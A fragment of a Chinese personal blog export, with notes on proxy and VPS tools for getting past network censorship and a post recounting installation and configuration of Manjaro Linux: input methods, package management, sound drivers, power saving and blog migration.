<h3 id="最后还是选择了机场">最后还是选择了机场</h3>
<p>现在性价比还是机场最高，同样是每月5美元机场大概能提供远高于自建的速度和线路选择（还有很多Netflix线路和低延迟节点）。</p>
<h3 id="移动dns投毒解决方案2019">移动DNS投毒解决方案2019</h3>
<p>使用Pcap_DNSProxy, 先下载<span class="exturl" data-url="aHR0cHM6Ly9ubWFwLm9yZy9kb3dubG9hZC5odG1s">nmap<i class="fa fa-external-link-alt"></i></span>再选winpcap兼容模式安装,再下载Pcap_DNSProxy安装时可能需要管理员权限。然后在网卡设定 DNS 解析为 127.0.0.1 (IPv4) 和 ::1 (IPv6) 。（适合电脑上折腾，有条件还是直接折腾路由器。） 详情参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NoZW5ncjI4L1BjYXBfRE5TUHJveHkvdHJlZS9tYXN0ZXIvRG9jdW1lbnRz">https://github.com/chengr28/Pcap_DNSProxy/tree/master/Documents<i class="fa fa-external-link-alt"></i></span> 以及<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmJnbWUubWUvcG9zdHMvc29tZS1pZGVhcy1hYm91dC1hbnRpLXBvbGx1dGlvbi1kbnMtc2VydmVy">https://blog.bgme.me/posts/some-ideas-about-anti-pollution-dns-server<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="更换vps厂商为hostwinds更换websocket协议为http2">更换VPS厂商为hostwinds,更换websocket协议为HTTP2</h3>
<p>决定把vultr换成速度更快的hostwinds，世界加钱可及（并没有钱搞Google Fi之类的物理穿越） hostwinds选项有VPS和cloud，cloud是按小时收费的，这个价位当然也不是aws或google cloud那种真正的云主机，问了下客服，答复如下：</p>
<p>The Difference Between VPS &amp; cloud There is no difference other than the name. The VPSs come with more of a preconfigured set up, Linux/Windows, managed/unmanaged, etc, where the Cloud would start as an unmanaged Linux VPS that you can add additional set up to.</p>
<p>这里我不小心选错了，发工单申请退款速度很快，客服一直在线（但是据说支付鸨坑你会给你退到余额里，不会给你退钱） 不愿意买一个月冒险想先试试的可以直接上小时收费的cloud选项 这家服务商有给提供rDNS功能，网上冲浪时记得伪装。别的都还好，就是机房有点少，不过暂时还没被盯上。速度也还行吧。（这家不太推荐用来建站, 小站除外）</p>
<p>看起来并不限速，但是我装上之后速度只有几百k，不知道为什么，有空再看看 &gt;Testing download speed................................................................................ Download: 248.93 Mbit/s Testing upload speed................................................................................................ Upload: 397.44 Mbit/s</p>
<p>应该是被运营商Qos降了优先级，还是kcp吧</p>
<h2 id="配置推荐">配置推荐</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dpbnVlcnpoL2dvc3Q=">gost<i class="fa fa-external-link-alt"></i></span> 用来搞搞跳板和二级代理和多级代理的跳板不错 <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BUYWNoeW9uRGV2ZWwv5ryr6LCI5ZCE56eN6buR56eR5oqA5byPLWRucy3mioDmnK/lnKjku6PnkIbnjq/looPkuK3nmoTlupTnlKgtNjJjNTBlNThjYmQw">漫谈各种黑科技式 DNS 技术在代理环境中的应用<i class="fa fa-external-link-alt"></i></span> DNS什么的看这里 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21lbGxvdy1pby9tZWxsb3c=">mellow<i class="fa fa-external-link-alt"></i></span> 跨平台的全局代理 <span class="exturl" data-url="aHR0cHM6Ly93d3cudjJyYXkuY29tLw==">Project V<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9ndWlkZS52MmZseS5vcmcv">新 V2Ray 白话文指南<i class="fa fa-external-link-alt"></i></span> 推荐稍微懂一点网络知识和能自己折腾VPS的自己直接照着文档和教程装就好了，一键安装脚本反而坑多（VPS小鸡只用来干这个可以直接脚本，但是至少要把默认端口之类的改一改） <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL216ejIwMTcvVjJSYXlB">v2rayA<i class="fa fa-external-link-alt"></i></span> 一个linux下的web配置工具，感觉还行。linux下图形界面客户端一直是个问题，这种小配置工具拿Qt或者electron搞出来的巨大的包总感觉怪怪的，还是直接web化在浏览器里面启动比较舒服 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc29mdGV0aGVyLm9yZy8=">https://www.softether.org/<i class="fa fa-external-link-alt"></i></span> 使用ssl型加密的vpn也有比较强的抗封锁能力（由于历史原因，属于第一批被墙打爆的重点照顾对象），但是搭建配置非常麻烦，速度也比v2慢，建议放弃（包月包年买服务另当别论） 这里有个wulabing的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3d1bGFiaW5nL1YyUmF5X3dzLXRsc19iYXNoX29uZWtleQ==">脚本<i class="fa fa-external-link-alt"></i></span> 卸载要这样。 &gt;如果不能重装系统，你可以通过删除以下文件夹，重新安装来完成更新 /etc/nginx /etc/v2ray /root/v2ray ~/.acme.sh</p>
<p>另， https://github.com/edwardz246003/shadowsocks</p>
<p>最后，土豪请直接机场，大土豪请去用境外实体卡和Google Fi</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/www.png" alt="Picture" style="zoom:80%;" /></p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>v2ray</tag>
      </tags>
  </entry>
  <entry>
    <title>你好，Manjaro。再见，Manjaro。</title>
    <url>/ff0e/</url>
    <content><![CDATA[<p>本来我是想装个双系统的，但是想起教研室还有两个老主机，那就..... <a id="more"></a></p>
<p><del>装Arch是不可能装Arch的</del></p>
<h2 id="更新再见manjaro">更新———再见Manjaro</h2>
<p>前一阵Manjaro社区出的争吵让我跑路了，Manjaro之前用的还比较舒服（当然直到现在都比较舒服），以后就不知道怎么样了。外面Arch社区骂声一片，里面还总在内斗，不断有人出走，前几周连jonathon都气走了（跑去隔壁endeavour os了）</p>
<p>jonathon的声明在<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5tYW5qYXJvLm9yZy90L2NoYW5nZS1vZi10cmVhc3VyZXItZm9yLW1hbmphcm8tY29tbXVuaXR5LWZ1bmRzLzE1NDg4OA==">这篇帖子<i class="fa fa-external-link-alt"></i></span></p>
<p>过程大概是这样的，philm（Manjaro的CEO，反正Manjaro社区的不少人都觉得此人非常讨厌）挪用社区赞助捐款2000欧元，用于给自己买的电脑。这次购买并没有跟掌钱管家jonathon商量，也没有在社区内征得同意。jonathon觉得按照规定这钱只能用于Manjaro项目的网站建设、项目推广之类的，不是给你们恰烂钱的，然后在论坛发帖子怼philm，然后帖子被删了一次，jonathon的管理员也被撤了。帖子下面众人纷纷表示philm不回应道歉以后再也不捐助Manjaro了，不少人表示以后再也不用Manjaro了，并考虑跑路到KDE Neon、Kubuntu、Arch、Endeavour OS。</p>
<p>philm的回应闪烁其辞，一直说事情不是大家想的那个样子的，但是大家怼他让他公布他和jonathon的完整聊天记录他又不肯。最后philm屁事没有，jonathon跑路去了Endeavour OS。</p>
<p>我之前从Ubuntu换到Manjaro，现在跟着jonathon跑到endeavour os（Antergos 的后继项目），因为懒得搞网卡驱动和g双显卡驱动了（这个Arch系的发行版显卡驱动、TLP和s-tui之类的也会附带装上，默认xfce桌面有很多系统自带的定制，我装的KDE，基本上相对于Arch没怎么魔改，附带了驱动个和很多常用的包）目前用着感觉还好，观察一下再评价。</p>
<h2 id="安装">安装</h2>
<p>选Manjaro是因为对华硕老主板的硬件和驱动支持比较好，安装也比较方便（我可不想自己折腾Nvida驱动）。</p>
<p>（喜欢KDE桌面，又不想用openSUSE，Kubuntu之前试过体验不是特别好，转了一圈就Manjaro了）</p>
<p>去官网下了最新版的 Manjaro18.1.5 KDE桌面版本，还是拿Rufus做好启动盘用UEFI装，这里把空闲的老机子直接擦除原来已毕业师兄的win10（erase disk），选 no Hibernate（我不太喜欢systemd，就没设休眠）</p>
<p>看到选项里有个选择LibreOffice还是Free Office的选项，这里我选了FreeOffice试用，体验过两个月再回来填坑写体会。 （更新，还是WPS吧。。。）</p>
<p>可以断网安装。没有遇到问题，直接装好了，超乎想象的顺利。唯一的小插曲是装完系统后U盘只剩4M空间，用win10默认的格式化找不回来了，看了<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNzc3MjgyNQ==">这里<i class="fa fa-external-link-alt"></i></span> 网上教程已经很多了，我也不打算再写一篇了，下面仅作个人记录(其实并不怎么需要教程，过时得太快，还不如直接看官方wiki或者iso里打包的安装手册，不想看直接照着提示直接装都没问题，比Ubuntu好装太多了) <img src="/ff0e/neofetch-manjaro.webp" alt="manjaro-neofetch" /> 内置python是3.8.1，我一时竟有些不习惯😂</p>
<h2 id="配置">配置</h2>
<h3 id="换镜像源">换镜像源</h3>
<p>当然还是换成你电的，在<code>/​etc/​pacman.d/​mirrorlist</code>加上你电</p>
<h3 id="输入法">输入法</h3>
<p>更新，现在有一个官方打包的AUR： manjaro-asian-input-support，在community里面，有manjaro-asian-input-support-fcitx、manjaro-asian-input-support-ibus、manjaro-asian-input-support-ibus、manjaro-asian-input-support-fcitx5</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S manjaro-asian-input-support-fcitx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后重启直接就能用了</p>
<p>KDE推荐fcitx，Gnome下大概ibus体验会好一点？（好吧其实我之前在Ubuntu Gnome上用的也是fcitx）</p>
<p><strong>下面这些都不用看了</strong></p>
<p>我用的<del>sunpinyin</del>libpinyin（一个比sunpinyin更新的输入法），googlepinyin也可以，sougoupinyin不推荐，对于它的流氓行为我实在无法放心（如果非要装，记得装fcitx qt4 或 qt5）</p>
<p>如果想要联网提示的功能可以装个cloudpinyin(要用archlinuxcn的源)</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S fcitx-im fcitx-googlepinyin fcitx-libpinyin fcitx-cloudpinyin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有个小问题，那个很多教程都写的/.xproflie, 官方wiki里新版是 ~/.pam_environment里面加上那三行, fcitx官网上说是那个~./xprofile, 这里我放到.pam_enviroment里面了。</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">GTK_IM_MODULE&#x3D;fcitx
QT_IM_MODULE&#x3D;fcitx
XMODIFIERS&#x3D;@im&#x3D;fcitx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后点开右下角键盘的configure（配置）看不到输入法了，界面是空的，以为是系统语言非中文的问题，但是换了系统语言重启了以后还是不行。 运行了一下fcitx-diagnose, 报这个错误</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">fcitx: BadWindow (invalid Window parameter)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>感觉是看不知道哪个教程的时候在~/.xinitrc里面乱配置的时候出问题了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LC_ALL</span></span><span class="token operator">=</span>zh_CN.UTF-8
<span class="token builtin class-name">export</span> <span class="token assign-left variable">GTK_IM_MODULE</span><span class="token operator">=</span>fcitx
<span class="token builtin class-name">export</span> <span class="token assign-left variable">QT_IM_MODULE</span><span class="token operator">=</span>fcitx
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">XMODIFIERS</span></span><span class="token operator">=</span><span class="token string">"@im=fcitx"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>搜了一下是我弱智了，看<span class="exturl" data-url="aHR0cHM6Ly9iYnMuYXJjaGxpbnV4Y24ub3JnL3ZpZXd0b3BpYy5waHA/aWQ9MTg2Mg==">这里<i class="fa fa-external-link-alt"></i></span>，照着教程乱搞的时候都没注意到。 这里把exec放到后面就行了，或者放到.xprofile里面</p>
<p>配置看这里 https://fcitx-im.org/wiki/Configure_(Other)/zh-hans</p>
<p>我看很多教程都是用的fcitx-configtool，这里推荐KDE桌面用kcm-fcitx进行设置，也可以直接编辑config文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S kcm-fcitx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="软件包管理">软件包管理</h3>
<h4 id="pacman">pacman</h4>
<p>装包首选pacman，然后是AUR，然后是其他pip、npm、deb之类的包（貌似Manjaro发布的20版pamac软件商店还支持了snap和flatpac......），然后是自己编译（对自己打包技术自信的编译狂魔请无视), 这样可以避免不少包冲突。 yaourt已经停止维护了<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>，2020年了很多教程都还是这个，请自行换成yay<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>等</p>
<p>另外多说一句，Manjaro很多地方和Arch还是不一样的，随便添加arch源或者archlinuxcn源是要出问题的</p>
<p>要加包优先从AUR里面加，尽量不要用archlinuxcn里的东西，Manjaro很多魔改和更新依赖版本速度和Arch不一样，非要使用archlinuxcn灵车漂移就把Manjaro设成unstable（并且出了事不要去archlinuxcn那里问，切记）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman-mirrors --api --set-branch unstable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>虽然名字叫unstable，但是它和Arch的stable基本上是类似的（它还要比Arch的stable慢三天），这意味着换成unstable再上archlinuxcn源灵车漂移翻车的几率会小一点。</p>
<p>Manjaro的包会比Arch的更新频率慢一点，Manjaro有三种选项，stable，testing和unstable，unstable比Arch的stable慢三天左右，testing比unstable慢，stable比testing慢。一般只是延后了几周而已，可以放心上unstable</p>
<h4 id="yay安装aur软件">yay安装AUR软件</h4>
<p>这里用vscode举个栗子</p>
<p>不像apt有官方包，VSCode在文档上说可以用这个<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9zZXR1cC9saW51eCNfYXVyLXBhY2thZ2UtZm9yLWFyY2gtbGludXg=">非官方包<i class="fa fa-external-link-alt"></i></span></p>
<p>按照正常的AUR安装方式是这样的</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S <span class="token function">git</span>
<span class="token builtin class-name">cd</span> /Downloads
<span class="token function">git</span> clone https://AUR.archlinux.org/visual-studio-code-bin.git
<span class="token builtin class-name">cd</span> visual-studio-code-bin/
<span class="token function">sudo</span> pacman -U visual-studio-code-bin-*.pkg.tar.xz
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/ <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">rm</span> -rfv visual-studio-code-bin/
code <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我们有<code>yay -S visual-studio-code-bin</code>可以代替上面那一串命令 （pacman现在也有了包，直接pacman就好了<code>pacman -S code</code>）</p>
<h4 id="pamac">pamac</h4>
<p>另一种方法是直接从软件商店里点击安装，pamac或者octopi，其实也不算win10 巨硬store或者snap那种软件商店，大概就是一个pacman的GUI客户端吧（很多时候报错和提示并不好用，建议下载和更新还是用命令）</p>
<p>尤其不要同时开着pamac图形界面并打开pacman，pacman进程加锁出错系统容易崩了</p>
<h3 id="网上冲浪">网上冲浪</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S v2ray<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>把config.json放到/etc/v2ray下面 然后配置开机自启和启动（这里用systemd）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> v2ray  <span class="token comment">#开机启动</span>
systemctl start v2ray<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后配合switchyomega或者<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21lbGxvdy1pby9tZWxsb3c=">mellow<i class="fa fa-external-link-alt"></i></span>或者<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvZmwwci9wcm94eWNoYWlucy1uZw==">proxychains-ng<i class="fa fa-external-link-alt"></i></span></p>
<p>如果还是习惯客户端可以试试v2rayA<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></p>
<h3 id="其他">其他</h3>
<p>暂时没什么要说了，过一个月再来说体验吧，美化什么的也不想搞了，老主机带不动，我也老了，哎呀，对花里胡哨的欣赏不来了，一律默认配置</p>
<p>想起什么再说吧，ArchWiki真棒，看Wiki吧</p>
<h4 id="一些设置的小问题">一些设置的小问题</h4>
<p>装完输入法之后输入法调不出来了，发现Yakuake也调不出来了，感觉快捷键设置冲突，改快捷键设置就好了。</p>
<h2 id="后记">后记</h2>
<p>总能看到一大批Arch玩家在Linux群里发洗手图疯狂劝退Manjaro用户 但是看到下面这篇，我决定还是用Manjaro吧。各种洗手劝退根本没给出让我换系统的强力理由 <span class="exturl" data-url="aHR0cHM6Ly9yZW50cnkuY28vbWFuamFyby1jb250cm92ZXJzaWVz">Manjaro Controversies<i class="fa fa-external-link-alt"></i></span> 中文版<span class="exturl" data-url="aHR0cHM6Ly9zemNsc3lhLm1lL3poLWNuL3Bvc3RzL2xpbnV4L21hbmphcm9fY29udHJvdmVyc2llcy8=">[译] Manjaro 悖论<i class="fa fa-external-link-alt"></i></span> 我还用windows呢，我还用Ubuntu呢，本弱智儿童欢乐多，你们随便怎么鄙视。自从当了硬件逃兵不折腾板子不玩单片机树莓派我连C都不怎么用，欢乐的拿python乱写脚本呢，节省心智的东西有时候真是好东西</p>
<p>人生苦短， In the long run, we are all dead（虽然我并不喜欢凯恩斯主义）</p>
<p>我一直觉得商业化是个好事，尤其是操作系统这种东西。私以为大多数情况下知识产权是个好东西，收费也是个好东西，垄断是个坏东西。开源的一个重要贡献就是打破垄断。（虽然现在很多专利什么的都被玩坏了，特别是国内） 操作系统这种工业级的东西，商业化是正道，<strong>微软的问题在于它的垄断，而不是商业化</strong></p>
<p>（这Manjaro一股 Windows Vista 味，好看好用，bug多也能接受</p>
<h2 id="时隔5个月的更新">时隔5个月的更新</h2>
<p>终于返校了，这疫情闹得，哎呀</p>
<p>据说长时间不追滚动更新可能滚炸，不管了，硬着头皮试一下</p>
<p>直接</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> pacman -Syyu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>更新后重启显示密码不对，不知道是什么问题，试着重置了一下密码</p>
<p>（并不是我忘记密码了，这里据说前一阵不少人的KDE桌面密码出问题登录认证失败了）</p>
<p>重启按esc进grub</p>
<p>按e，在有<code>linux /boot /vmlinuz-linux</code>的那一行添加<code>init=/bin/bash</code></p>
<p>ctrl+x出去输入<code>mount -n -o remount,rw /</code>给根目录读写权限，然后输<code>passwd</code>改密码，然后<code>reboot</code>重启</p>
<p>看起来没什么问题了，隔了几个月也没滚炸（至少看起来没有）</p>
<h2 id="笔记本也换成manjaro了">笔记本也换成Manjaro了</h2>
<h3 id="安装-1">安装</h3>
<p>小破本是灵越7591，不太想用win10了，Dell家的大部分系列都完美兼容Ubuntu（国外出售的7590的还有个developer版的装的就是Ubuntu，比预装win10少了一点微软授权费，可惜国内没有）</p>
<p>看到他们好多用黑苹果，我的本子不是4k，就没上黑果。（黑果Nvida独显也用不了）</p>
<p>Manjaro看到别人装上去还不错，索性就装Manjaro了（除了麦克风和显卡的驱动有点小麻烦，其他的蓝牙wifi触控板键盘休眠一切正常）Archwiki上也有同系列7590的参考<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a></p>
<p>BIOS里关secureboot，改raid on为AHIC（不装双系统可以忽略，双系统记得改AHIC不然win10会蓝屏卡在启动界面）</p>
<p>装完发现Manjaro 20居然添加了snap商店，这是要跟Canonical同流合污？（逐渐Ubuntu化</p>
<p>KDE桌面内存占用在700M左右，还行</p>
<p>Ubuntu的显卡和外接显示器对Dell的本子都配适的极好，有Dell官方担保，不想折腾可以直接上Ubuntu（这款海外版有的就是预装Ubuntu，双显卡解决方案应该是Prime）</p>
<h3 id="显卡驱动问题">显卡驱动问题</h3>
<p>不需要Nvida的卡就直接选free，装intel的核显就好了</p>
<p>想用Nvida的卡（好歹是一块1650ti不用太浪费了），装的时候Manjaro驱动选项可以直接选nofree，会自带</p>
<p>切换双显卡的配置可能导致看视频时卡成PPT，禁用硬件加速就好了，7591的丐版CPU硬解码也是带的动视频的（1080p没有任何问题）</p>
<h3 id="麦克风声卡配置">麦克风声卡配置</h3>
<p>之前7591的部分高通声卡驱动不行，麦克风用不了，后来有了一个开源的驱动<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXNvZnByb2plY3Qvc29m">Sound open firmware<i class="fa fa-external-link-alt"></i></span>，总归是能用了。</p>
<p>在linux kernel在5.6或以上，安装麦克风声卡驱动用的sof-firmware，可以解决声音和麦克风问题</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S sof-firmware<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后重启，我第二次重启后失效，喇叭和耳机都没有声音。按照wiki里面修改<code>/etc/modprobe.d/audio-fix.conf</code>(新建一个)，然后写一行</p>
<pre class="line-numbers language-config" data-language="config"><code class="language-config">options snd-intel-dspcfg dsp_driver&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>就行了。</p>
<p>或者在Grub的配置文件<code>/etc/default/grub</code>里设置</p>
<pre class="line-numbers language-config" data-language="config"><code class="language-config">snd-intel-dspcfg.dsp_driver&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>实在不行再试试内核参数(Kernel parameters)加上<code>snd_hda_intel.dmic_detect=0</code></p>
<p>当然，仅仅是能用。声音效果不是太好，虽然灵越inspiron 7591/7590/7501 系列的扬声器声音本来就不太好，但是放点陶笛和埙的曲子还是有种凄婉呜咽感的，linux下用了sof之后感觉像是喇叭声。以后就只适合拿这个听刀郎了。</p>
<p>还有一个问题就是有的时候休眠挂起后再打开就没声音了，需要重启才行。暂时没找到什么好的办法，这个毛病之前win10就有</p>
<h3 id="mm耳机没声音">3.5mm耳机没声音</h3>
<p>耳机孔没声音，wiki上的解决方案是</p>
<blockquote>
<p>In <code>pavucontrol</code>, try changing the Pulseaudio output profile from "Analog Stereo Output" to "Analog Stereo Duplex".</p>
</blockquote>
<p>系统语言调成中文的用户点开系统设置-》音频音量设置=》音频=》高级=》内置音频，选模拟立体双工。</p>
<p>是的，这样就能用了（请忽略这个全损音质，耳机传来声音的时候我甚至觉得我的索尼耳机是拼多多10块钱买的）</p>
<h3 id="耗电问题">耗电问题</h3>
<p>这个目前我倒是没什么感觉，我的7591是97w的大电池版本，最好的省电办法是不用GNOME，KDE的掉电速度比GNOME大概能慢一半，轻度使用六七个小时没有太大问题。（跟win10上10个小时比还是有差距）。</p>
<p>极致省电可以上i3wm和禁用独显，不过7591电池够大，不像游戏本一样分分钟没电，倒是没有必要。</p>
<p>还有就是降压，给CPU降个50-75mV，效果感人。（对性能影响也很小）</p>
<p>然后安装thermald和tlp并设置开机自启动（tlp有个图形界面可惜是gtk的并且还在beta版，不太KDE用户建议用）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S thermald tlp
systemctl <span class="token builtin class-name">enable</span> thermald tlp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后自行设置电池模式。</p>
<h3 id="散热">散热</h3>
<p>当然7591/7590更要命的显然是捉急的散热，重度使用建议降压、换散热贴硅脂散热条、垫橡皮垫都安排上。有个s-tui可以查看CPU温度。</p>
<h2 id="其他个人设置">其他个人设置</h2>
<h3 id="常用软件">常用软件</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker</span>
<span class="token function">sudo</span> pacman -S docker docker-compose
<span class="token comment"># 设置开机自启</span>
<span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="中英词典翻译和医学词典">中英词典翻译和医学词典</h4>
<p>这里我用的开源的GoldenDict配合离线和在线词典</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S goldendict<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>下载医学词典和英文词典，体验还是不错的，想要翻译功能可以添加有道和谷歌翻译</p>
<h3 id="博客搬迁">博客搬迁</h3>
<p>先装node.js（这里我装的12的lts版）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -Sy nodejs-lts-erbium<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后从github拉取自己的博客备份repo</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/archaeoraptor/blog.git blog
<span class="token builtin class-name">cd</span> blog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>另外我用的hexo-renderer-pandoc插件，这个插件要先装pandoc（不然会报错）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S pandoc
<span class="token function">npm</span> <span class="token function">install</span>
<span class="token function">git</span> clone https://github.com/next-theme/hexo-theme-next.git themes/next
hexo g <span class="token operator">&amp;&amp;</span> hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="windows软件解决方案">windows软件解决方案</h3>
<p>装wine体验还是不太好，虚拟机装个win7上跑qq和word，反正7591能加内存，加到32G就完事了，还不够就加64G（是的，这个系列支持64G内存，虽然说明书上写的只支持到32G）</p>
<h3 id="网上冲浪-1">网上冲浪</h3>
<p>qv2ray还不错，electron-ssr装上v2ray插件也不错，但是electron内存占用太高了。喜欢web版的还有一个v2raya可以用。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S qv2ray<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>装wireguard</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S wireguard-tools wireguard-dkms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果用机场的话，可以装个clash，然后配置开机自启和规则（那个win版clash的图形界面真的反直觉反人类，相当难受，clashy也没好到哪去），貌似也支持套个tun/tap用来全局代理(似乎并不怎么好用)</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S clash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以配置systemd让clash开机自启，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0RyZWFtYWNyby9jbGFzaC93aWtpL2NsYXNoLWFzLWEtZGFlbW9u">wiki<i class="fa fa-external-link-alt"></i></span>上还提供了docker-compose和pm2的方法(配置文件放在<code>~/.config/clash</code> )。(貌似pm2方便一点？尤其是装了nodejs的话，不过clash是go开发的官方推荐docker，不过docker和pm2要开机自启还是得用systemd)</p>
<p>上个月发布的clash1.0版本是和老版本不兼容的<a href="#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>，AUR里打包的clash是不兼容的，所以要手动修改yml文件或者自己编译老版本的clash</p>
<blockquote>
<p><code>Proxy</code>, <code>Proxy Group</code> and <code>Rule</code> is no longer used. They are now respectively <code>proxies</code>, <code>proxy-groups</code> and `rules</p>
</blockquote>
<p>(修改的话一般只要修改<code>Proxy</code>, <code>Proxy Group</code> and <code>Rule</code> 这三个参数为<code>proxies</code>, <code>proxy-groups</code> and `rules就行了)</p>
<p>设置完成后重启网络服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart systemd-networkd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="中英文和字体设置">中英文和字体设置</h3>
<h4 id="把桌面文件夹改回英文">把桌面文件夹改回英文</h4>
<p>这里我用的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dOT01FL3hkZy11c2VyLWRpcnMtZ3Rr">xdg-user-dirs-gtk<i class="fa fa-external-link-alt"></i></span>，GNOME出品，KDE上也能用</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -Sy xdg-user-dirs-gtk
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>en_US
xdg-user-dirs-gtk-update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后想把LANG变量调回中文的可以再调回来</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>zh_CN.UTF-8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果你用Dolphin文件夹管理器，你要把那几个桌面、文档、下载的路径在编辑里面手动改成英文</p>
<h4 id="tty中文不显示">tty中文不显示</h4>
<p>装点字体就好了，或者直接把全局的LANG=en.US</p>
<h4 id="复门等字体显示日文">复门等字体显示日文</h4>
